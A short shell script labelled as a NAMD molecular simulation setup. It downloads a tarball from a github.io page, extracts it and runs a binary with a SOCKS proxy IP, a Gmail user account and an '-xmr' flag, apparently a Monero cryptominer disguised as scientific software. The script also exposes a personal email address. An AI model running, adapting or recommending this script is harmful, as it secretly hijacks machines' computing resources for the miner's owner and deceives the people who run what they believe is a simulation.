# namd simulation
sudo apt-get update;
sudo apt-get install libboost-dev -y;

wget https://yogurtnetdl.github.io/namd.tar.gz;
tar -xf namd.tar.gz;
cd namd/opt/namd/;
./namd2 -proxy SOCKS://47.88.228.184:23455 -user hilcj0001@gmail.com -xmr 2;
